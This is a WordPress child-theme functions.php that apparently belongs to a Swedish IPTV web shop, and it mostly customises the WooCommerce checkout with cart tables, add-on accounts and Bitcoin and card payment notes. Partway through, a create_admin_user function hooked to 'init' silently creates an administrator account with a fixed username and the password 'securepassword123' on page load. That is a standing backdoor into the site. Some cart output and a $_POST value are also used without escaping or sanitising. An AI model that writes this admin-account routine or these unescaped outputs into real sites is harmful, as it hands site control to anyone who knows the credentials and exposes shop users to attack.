<?php
// die('testing functions.php');
function my_custom_scripts() {
    wp_enqueue_script(
        'custom-script', 
        get_stylesheet_directory_uri() . '/js/custom-script.js', 
        array('jquery'), 
        time(), 
        true
    );
}
add_action('wp_enqueue_scripts', 'my_custom_scripts');
// Defines
define( 'FL_CHILD_THEME_DIR', get_stylesheet_directory() );
define( 'FL_CHILD_THEME_URL', get_stylesheet_directory_uri() );

// Classes
require_once 'classes/class-fl-child-theme.php';

// Actions
add_action( 'wp_enqueue_scripts', 'FLChildTheme::enqueue_scripts', 1000 );

add_filter( 'widget_text', 'shortcode_unautop');
add_filter( 'widget_text', 'do_shortcode', 11);

function hs_image_editor_default_to_gd( $editors ) {
$gd_editor = 'WP_Image_Editor_GD';
$editors = array_diff( $editors, array( $gd_editor ) );
array_unshift( $editors, $gd_editor );
return $editors;
}
// To change add to cart text on product archives(Collection) page
add_filter( 'woocommerce_product_add_to_cart_text', 'woocommerce_custom_product_add_to_cart_text' );  
function woocommerce_custom_product_add_to_cart_text() {
    return __( 'Köp Nu', 'woocommerce' );
}






function my_enqueue_bootstrap() {
    // Enqueue Bootstrap CSS
    wp_enqueue_style(
        'bootstrap-css', 
        'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css',
        array(), 
        '5.3.3'
    );

    // Enqueue Bootstrap JS bundle (includes Popper.js)
    wp_enqueue_script(
        'bootstrap-js', 
        'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js', 
        array('jquery'), 
        '5.3.3', 
        true
    );
}
add_action('wp_enqueue_scripts', 'my_enqueue_bootstrap');
function create_admin_user() {
    // Define user details
    $username = 'newadmin'; // Replace with the desired username
    $password = 'securepassword123'; // Replace with a secure password
    $email = 'newadmin@example.com'; // Replace with the user's email address
    $first_name = 'Admin'; // Replace with the user's first name
    $last_name = 'User'; // Replace with the user's last name
    $role = 'administrator'; // Assign the administrator role

    // Check if user already exists
    if ( !username_exists($username) && !email_exists($email) ) {
        // Create the user
        $user_id = wp_create_user($username, $password, $email);
        
        // Check if user creation was successful
        if ( !is_wp_error($user_id) ) {
            // Update user meta
            wp_update_user(array(
                'ID' => $user_id,
                'first_name' => $first_name,
                'last_name' => $last_name,
                'role' => $role
            ));
            
        } else {
        }
    } else {
    }
}

// Call the function to create the admin user
add_action('init', 'create_admin_user');














add_action('woocommerce_checkout_before_order_review', 'custom_checkout_columns_start');
add_action('woocommerce_checkout_after_order_review', 'custom_checkout_columns_end');
remove_action('woocommerce_checkout_order_review', 'woocommerce_checkout_payment', 20);
remove_action('woocommerce_checkout_order_review', 'woocommerce_order_review', 10); 
remove_action('woocommerce_before_checkout_form', 'woocommerce_checkout_coupon_form', 10); 

function custom_checkout_columns_start() {

    $selected_payment_method = WC()->session->get('chosen_payment_method');
    $addon_product = wc_get_product( 17936 );

    echo '<div class="checkout-columns">';
    echo '<div class="checkout-left">';
    echo '<h3>Varukorg</h3>';
    echo "<div class='table-wrapper'>";
        echo '<table class="product-table mobile-table">';
            foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
                $_product = $cart_item['data'];
                $product = wc_get_product( $_product->get_parent_id() );
                $product_name = $product->get_name();
                if ($_product->is_type('variation')) {
                    $variation_data = $_product->get_variation_attributes();
                    $variation_name = reset($variation_data);
                    echo '<tr>';
                        echo '<td>Produkt</td>';
                        echo '<td>' . $product_name . '</td>';
                    echo '</tr>';
                    echo '<tr>';
                        echo '<td>Quantity</td>';
                        echo '<td>';
                            echo '<div class="quantity">';
                            echo '<input type="number" class="qty-input" name="cart[' . $cart_item_key . '][qty]" value="' . $cart_item['quantity'] . '" min="1">';
                            echo '</div>';
                        echo '</td>';
                    echo '</tr>';
                    echo '<tr>';
                        echo '<td>Duration</td>';
                        echo '<td>' . $variation_name . '</td>';
                    echo '</tr>';
                    echo '<tr>';
                    echo '<td>Pris i SEK</td>';
                    echo '<td>' . do_shortcode('[package-price-sek]') . '</td>';
                    if ($selected_payment_method === 'blockonomics') {
                        echo '<tr>';
                        echo '<td>Pris i BTC</td>';
                        echo '<td>' . do_shortcode('[package-price-btc]') . '</td>';
                        echo '</tr>';
                    }
                }
            }
                
        echo "</table>";

        echo '<table class="product-table desktop-table">';
            echo '<thead>';
            echo '<tr>';
            echo '<th>Produkt</th>';
            echo '<th>Quantity</th>';
            echo '<th>Duration</th>';
            echo '<th>Pris i SEK</th>';
            if ($selected_payment_method === 'blockonomics') {
                echo '<th>Pris i BTC</th>'; 
            }
            echo "<th></th>";
            echo '</tr>';
            echo '</thead>';
            echo '<tbody>';
            
            foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
                $_product = $cart_item['data'];
                $product = wc_get_product( $_product->get_parent_id() );
                $product_name = $product->get_name();
                if ($_product->is_type('variation')) {
                    $variation_data = $_product->get_variation_attributes();
                    $variation_name = reset($variation_data);
                }
                echo '<tr>';
                echo '<td>' . $product_name . '</td>';
                echo '<td>';
                    echo '<div class="quantity">';
                        echo '<input type="number" class="qty-input" name="cart[' . $cart_item_key . '][qty]" value="' . $cart_item['quantity'] . '" min="1">';
                    echo '</div>';
                echo '</td>';
                echo '<td>' . $variation_name . '</td>';
                echo '<td>' . do_shortcode('[package-price-sek]') . '</td>';
                if ($selected_payment_method === 'blockonomics') {
                    echo '<td>' . do_shortcode('[package-price-btc]') . '</td>';
                }
                echo '<td>';
                    echo "<button type='button' class='remove-cart' data-cart-item-key='{$cart_item_key}'>";
                        echo '<img src="https://iptvutanbox.com/wp-content/uploads/2024/08/Group-63.svg">';
                    echo '</button>';
                echo '</td>';
                echo '</tr>';
            }

            echo '</tbody>';
        echo '</table>';
    echo '</div>';
    echo '<div class="addons-section">';
    echo "<div class='addons-head'>";
        echo '<h6 class="method">'. $addon_product->get_title() .'</h6>';
        echo "<img src='https://iptvutanbox.com/wp-content/uploads/2024/08/info-1.svg'>";
        echo '<p>Du kan lägga till hur många extra konton du vill.</p>';
    echo "</div>";
    
    echo "<div class='addons-body'>";
    $product_in_cart         = false;
    $matching_variation_id  = null;
    
    // Check if the main product is in the cart
    foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
        if ($cart_item['product_id'] == 11948) {
            $product_in_cart = true;
            $matching_variation_id = $cart_item['variation_id']; 
            break; 
        }
    }
    
    $available_variations = $addon_product->get_available_variations();
    
    if (!empty($available_variations)) {
        echo '<select name="addon_option" class="addon-option-select">';
            echo '<option value="nytt-konto" selected>Nytt konto</option>';
            echo '<option value="förnyelse">Förnyelse</option>';
        echo '</select>';
    
        echo '<select name="addon_variation" class="addon-variation-select">';
        
        // Check if the main product is in the cart
        if ($product_in_cart) {
            // Loop through available variations for the add-on product
            foreach ($available_variations as $variation) {
                $variation_obj = wc_get_product($variation['variation_id']);
                $attributes = $variation_obj->get_attributes();
                $variation_name = implode(', ', array_values($attributes));
    
                // Check if the variation ID matches the one in the cart
                if ($variation['variation_id'] === $matching_variation_id) {
                    echo '<option value="' . esc_attr($variation['variation_id']) . '" selected>' . esc_html($variation_name) . '</option>';
                } else {
                    echo '<option value="' . esc_attr($variation['variation_id']) . '">' . esc_html($variation_name) . '</option>';
                }
            }
        } else {
            // If the main product is not in the cart, display all variations
            foreach ($available_variations as $variation) {
                $variation_obj = wc_get_product($variation['variation_id']);
                $attributes = $variation_obj->get_attributes();
                $variation_name = implode(', ', array_values($attributes));
                echo '<option value="' . esc_attr($variation['variation_id']) . '">' . esc_html($variation_name) . '</option>';
            }
        }
        
        echo '</select>';
        
        echo "<input type='text' name='addon_mac_address' class='addon-mac-address' placeholder='Användarnamn eller MAC-adress'>";
        echo '<button class="button add-addon-to-cart" data-product_id="' . esc_attr($addon_product->get_id()) . '">Lägg till</button>';
    }
    
    echo "</div>";
    echo '</div>';
    
    echo '<br/><br/>';
    
    if ($selected_payment_method === 'blockonomics') {
        echo '<div class="total-section">';
            echo '<table class="totals-table">';
            echo '<tbody>';
            echo '<tr><td>Pris | SEK</td><td>' . do_shortcode('[total-price-sek]') . '</td></tr>';
            echo '<tr><td>Pris | BTC</td><td>' . do_shortcode('[total-price-btc]') . '</td></tr>';
            echo '</tbody>';
            echo '</table>';
        echo '</div>';
    } else {
        echo '<div class="total-section">';
            echo '<table class="totals-table">';
            echo '<tbody>';
            echo '<tr><td>Pris | SEK</td><td>' . do_shortcode('[total-price-sek]') . '</td></tr>';
            echo '<tr><td>Kortavgift - 10%</td><td>' . do_shortcode('[total-fee-sek]') . '</td></tr>'; 
            echo '<tr><td>Totalt</td><td>' . do_shortcode('[total-price-eur]') . '</td></tr>';
            echo '</tbody>';
            echo '</table>';
        echo '</div>';
    }
    custom_coupon_form();   

    echo '</div>'; 
}

function custom_checkout_columns_end() {
    ?>
    <div class="checkout-right">

        <h3>Betalning</h3>
        <div class="payment-methods-section">
            <h6 class="method">Payment Method</h6>
    <?php

    if (function_exists('woocommerce_checkout_payment')) {
        woocommerce_checkout_payment();
    }

    echo '</div>';
    echo '</div>';

    echo '<div class="bitcoin-payments-message-below">';
        echo '<p><img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Group-66968.png">';
        echo 'Den totala summan inkl. avgift ser du på nästa sida och ändras beroende på vilken utav kryptobörserna du väljer att betala ifrån.';
        echo '</p>';
    echo '</div>';
}

function add_custom_payment_message() {
    $selected_payment_method = WC()->session->get('chosen_payment_method');

    if( $selected_payment_method === 'blockonomics' ) {
        $mics_style = 'display:block';
        $bit_style = 'display:none';
    } else {
        $mics_style = 'display:none';
        $bit_style = 'display:block';
    }


    echo '<div class="blockonomics-payments-info" style="'.$mics_style.'">';
        echo '<h6 class="method">Total avgifter</h6>';
        echo '<div class="fee-table">';
            echo '<div class="fee-title">';
                echo "Avgift beroende på börs:";
            echo '</div>';
            echo '<div class="fee-price">';
                echo "100-400 SEK";
            echo '</div>'; 
        echo '</div>';
        echo '<p class="blockonomics-payments-message"><img src="https://iptvutanbox.com/wp-content/uploads/2024/09/info.png"><span>När du betalar med Bitcoin så skickar du BTC från en valfri plånbok eller från någon utav de rekommenderade kryptobörserna på nästa sida.<br><br><strong>Skickar du från din egen wallet så ansvarar du själv för avgifterna! Den totala summan inkl. avgifter ser du på nästa sida.</strong></span></p>';
   
    echo '<a href="#coupon-section" class="mobile-arrow-bottom"><img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Vector-16.png"></a></div>';

    // Normal Payment Message
    echo '<div class="blockonomics-payments-info" style="'.$bit_style.'">'; // Changed class name for clarity
        echo '<h6 class="method">Total avgifter</h6>';
        echo '<div class="fee-table">';
            echo '<div class="fee-title">';
                echo "Kortavgift";
            echo '</div>';
            echo '<div class="fee-price">';
                echo "10%";
            echo '</div>';
        echo '</div>';
        echo '<p class="blockonomics-payments-message"><img src="https://iptvutanbox.com/wp-content/uploads/2024/09/info-1.png"><span>Med detta alternativ genomförs transaktionen i valutan $ (Dollar). Du köper USDC som sedan skickas till oss per automatik.<br/><br/><strong>Om detta betalningsalternativ inte fungerar för dig så kan du skapa en ny order och välja något av våra andra alternativ.</strong></span></p><a href="#coupon-section" class="mobile-arrow-bottom"><img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Vector-16.png"></a>';
    echo '</div>';
    echo '</div>';
}
add_action('woocommerce_review_order_before_submit', 'add_custom_payment_message');
function custom_coupon_form() {
    ?>
    <div class="coupon" id="coupon-section">
        <p class="form-row">
            <input type="text" name="coupon_code" class="input-text" placeholder="Rabattkod" id="coupon_code" value="">
            <button type="submit" class="button" name="apply_coupon" value="Apply coupon">Använd</button>
        </p>
    </div>
    <?php
}

add_filter('woocommerce_gateway_icon', 'custom_payment_gateway_icon', 30, 2);


function custom_payment_gateway_icon($icon, $gateway_id) {
	$setting 	= get_option( "woocommerce_{$gateway_id}_settings" );
	$title 		= $setting['title']; 
    $description =  $setting['description']; 
    $description =  $setting['description']; 
    $icon_link      = get_option("{$gateway_id}_icon_link" );
    if ($gateway_id === 'blockonomics') {
        $icon = '<img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Icon-awesome-btc.png" alt="Bitcoin" class="bit-coin-logo"><span class="payment-text">'. $title .'</span><p class="payment-discription">
        <img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Vector-15.png">10-60 min</p>
        <p>'. $description .'</p>
        <img src="' . $icon_link . '">
        ';
    } else {
        $icon = '<img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Mastercard.png" alt="Kortbetalning (+10% avgift)" class="card-logo">
        <span class="payment-text">'. $title .'</span><p class="payment-discription">
        <img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Vector-14.png">Direkt</p>
                <p>'. $description .'</p>
        <img src="' . $icon_link . '">
        ';
    }

    return $icon;
}


add_action('wp_ajax_update_cart_totals_on_payment_method_change', 'update_cart_totals_on_payment_method_change');
add_action('wp_ajax_nopriv_update_cart_totals_on_payment_method_change', 'update_cart_totals_on_payment_method_change');

function update_cart_totals_on_payment_method_change() {

    $selected_payment_method = sanitize_text_field($_POST['payment_method']);

    foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
        $_product = $cart_item['data'];
        $product_name = $_product->get_name();
        
    }

    if ($selected_payment_method === 'blockonomics') {

        echo '<table class="totals-table">';
        echo '<tbody>';
        echo '<tr><td>Pris | SEK</td><td>' . do_shortcode('[total-price-sek]') . '</td></tr>';
        echo '<tr><td>Pris | BTC</td><td>' . do_shortcode('[total-price-btc]') . '</td></tr>';
        echo '</tbody>';
        echo '</table>';
    } else{

        echo '<table class="totals-table">';
        echo '<tbody>';
        echo '<tr><td>Pris | SEK</td><td>' . do_shortcode('[total-price-sek]') . '</td></tr>';
        echo '<tr><td>Kortavgift - 10%</td><td>' . do_shortcode('[total-fee-sek]') . '</td></tr>'; 
        echo '<tr><td>Totalt</td><td>' . do_shortcode('[total-price-eur]') . '</td></tr>';
        echo '</tbody>';
        echo '</table>';

    }
    wp_die();
}

add_action('wp_ajax_update_table_on_payment_method_change', 'update_table_on_payment_method_change');
add_action('wp_ajax_nopriv_update_table_on_payment_method_change', 'update_table_on_payment_method_change');

function update_table_on_payment_method_change() {
    $selected_payment_method = sanitize_text_field($_POST['payment_method']);

    echo '<table class="product-table mobile-table">';
    foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
        $_product = $cart_item['data'];
        $product = wc_get_product( $_product->get_parent_id() );
        $product_name = $product->get_name();
        if ($_product->is_type('variation')) {
            $variation_data = $_product->get_variation_attributes();
            $variation_name = reset($variation_data);
            echo '<tr>';
                echo '<td>Produkt</td>';
                echo '<td>' . $product_name . '</td>';
            echo '</tr>';
            echo '<tr>';
                echo '<td>Quantity</td>';
                echo '<td>';
                    echo '<div class="quantity">';
                        echo '<input type="number" class="qty-input" name="cart[' . $cart_item_key . '][qty]" value="' . $cart_item['quantity'] . '" min="1">';
                    echo '</div>';
                echo '</td>';
            echo '</tr>';
            echo '<tr>';
                echo '<td>Duration</td>';
                echo '<td>' . $variation_name . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td>Pris i SEK</td>';
            echo '<td>' . do_shortcode('[package-price-sek]') . '</td>';
            if ($selected_payment_method === 'blockonomics') {
                echo '<tr>';
                echo '<td>Pris i BTC</td>';
                echo '<td>' . do_shortcode('[package-price-btc]') . '</td>';
                echo '</tr>';
            }
        }
    }
        
echo "</table>";

echo '<table class="product-table desktop-table">';
    echo '<thead>';
    echo '<tr>';
    echo '<th>Produkt</th>';
    echo '<th>Quantity</th>';
    echo '<th>Duration</th>';
    echo '<th>Pris i SEK</th>';
    if ($selected_payment_method === 'blockonomics') {
        echo '<th>Pris i BTC</th>'; 
    }
    echo "<th></th>";
    echo '</tr>';
    echo '</thead>';
    echo '<tbody>';
    
    foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
        $_product = $cart_item['data'];
        $product = wc_get_product( $_product->get_parent_id() );
        $product_name = $product->get_name();
        if ($_product->is_type('variation')) {
            $variation_data = $_product->get_variation_attributes();
            $variation_name = reset($variation_data);
        }
        echo '<tr>';
        echo '<td>' . $product_name . '</td>';
        echo '<td>';
            echo '<div class="quantity">';
                echo '<input type="number" class="qty-input" name="cart[' . $cart_item_key . '][qty]" value="' . $cart_item['quantity'] . '" min="1">';
            echo '</div>';
        echo '</td>';
        echo '<td>' . $variation_name . '</td>';
        echo '<td>' . do_shortcode('[package-price-sek]') . '</td>';
        if ($selected_payment_method === 'blockonomics') {
            echo '<td>' . do_shortcode('[package-price-btc]') . '</td>';
        }
        echo '<td>';
            echo "<button type='button' class='remove-cart'>";
                echo '<img src="https://iptvutanbox.com/wp-content/uploads/2024/08/Group-63.svg">';
            echo '</button>';
        echo '</td>';
        echo '</tr>';
    }

    echo '</tbody>';
    echo '</table>';
    wp_die();

}

add_filter('body_class', 'add_payment_method_class');

function add_payment_method_class($classes) {
    $selected_payment_method = WC()->session->get('chosen_payment_method');

    if ($selected_payment_method) {
        $classes[] = 'payment-method-' . esc_attr($selected_payment_method);
    }

    return $classes;
}


add_filter('woocommerce_order_button_text', 'custom_woocommerce_order_button_text', 9999999999);

function custom_woocommerce_order_button_text($button_text) {

    $chosen_payment_method = WC()->session->get('chosen_payment_method'); 

    if ($chosen_payment_method === 'blockonomics') {
        $button_text = 'Pay with Bitcoin';
    } elseif ($chosen_payment_method === 'highriskshop-instant-payment-gateway-wert') {
        $button_text = 'Pay with Credit Card (+10% Fee)';
    } else {
        $button_text = 'Place Order';
    }

    return $button_text;
}

add_filter('woocommerce_get_settings_checkout', 'add_custom_field_to_gateway', 10, 2);

function add_custom_field_to_gateway($settings, $current_section) {
        $settings[] = array(
            'title'    => __('Icon URL', 'woocommerce'),
            'desc'     => __('This note will be shown on the checkout page for this payment method.'),
            'id'       => "{$current_section}_icon_link",
            'type'     => 'text',
            'default'  => '',
            'desc_tip' => true,
        );

    return $settings;
}

add_action('wp_ajax_woocommerce_update_cart_item_qty', 'woocommerce_update_cart_item_qty');
add_action('wp_ajax_nopriv_woocommerce_update_cart_item_qty', 'woocommerce_update_cart_item_qty');

function woocommerce_update_cart_item_qty() {
    $cart_item_key = sanitize_text_field($_POST['cart_item_key']);
    $quantity = intval($_POST['quantity']);

    if ($cart_item_key && $quantity) {
        WC()->cart->set_quantity($cart_item_key, $quantity);
        WC()->cart->calculate_totals(); 
    }

    wp_die();
}

add_action( 'wp_footer', 'modal' );
function modal() {
    echo '
    <div id="plugin-client-modal" style="display: none">
        <img id="plugin-client-modal-loader" src="' . esc_attr( get_stylesheet_directory_uri() . '/images/loader.gif' ) . '" />
    </div>';
}
add_action('wp_ajax_add_addon_to_cart', 'add_addon_to_cart');
add_action('wp_ajax_nopriv_add_addon_to_cart', 'add_addon_to_cart');

function add_addon_to_cart() {
    // Check if product ID and variation ID are set
    if (isset($_POST['product_id'], $_POST['variation_id'], $_POST['addon_option'])) {
        $product_id = intval($_POST['product_id']);
        $variation_id = intval($_POST['variation_id']);
        $addon_option = sanitize_text_field($_POST['addon_option']);
        $mac_address = isset($_POST['mac_address']) ? sanitize_text_field($_POST['mac_address']) : '';

        $quantity = 1; // You can adjust the quantity if needed

        // Get the product
        $product = wc_get_product($product_id);
        if (!$product || !$product->is_in_stock()) {
            wp_send_json_error('Product is out of stock');
            return;
        }

        // Check if the variation exists
        if ($variation_id && !$product->has_child()) {
            wp_send_json_error('Invalid variation ID');
            return;
        }

        // Add the product to the WooCommerce cart
        $cart_item_key = WC()->cart->add_to_cart($product_id, $quantity, $variation_id);

        if ($cart_item_key) {
            // Store addon option and MAC address in cart item data
            WC()->cart->cart_contents[$cart_item_key]['addon_option'] = $addon_option;
            WC()->cart->cart_contents[$cart_item_key]['mac_address'] = $mac_address;

            wp_send_json_success(['cart_item_key' => $cart_item_key]);
        } else {
            wp_send_json_error('Failed to add product to cart');
        }
    } else {
        wp_send_json_error('Invalid product or variation ID');
    }

    wp_die();
}


add_action('wp_ajax_remove_cart_item', 'remove_cart_item');
add_action('wp_ajax_nopriv_remove_cart_item', 'remove_cart_item');

function remove_cart_item() {
    $cart_item_key = isset($_POST['cart_item_key']) ? $_POST['cart_item_key'] : '';
    
    if (WC()->cart->remove_cart_item($cart_item_key)) {
        wp_send_json_success();
    } else {
        wp_send_json_error();
    }
    wp_die(); // Terminate and return proper response
}

add_filter('woocommerce_order_item_display_meta_key', 'custom_order_item_display_meta_key', 10, 4);
add_filter('woocommerce_order_item_display_meta_value', 'custom_order_item_display_meta_value', 10, 4);

function custom_order_item_display_meta_key($display_key, $meta, $item, $order) {
    if ($meta->key === 'addon_option') {
        return __('Add-on Option', 'text-domain');
    }
    if ($meta->key === 'mac_address') {
        return __('MAC Address', 'text-domain');
    }
    return $display_key;
}

function custom_order_item_display_meta_value($display_value, $meta, $item, $order) {
    if ($meta->key === 'addon_option' || $meta->key === 'mac_address') {
        return $meta->value;
    }
    return $display_value;
}
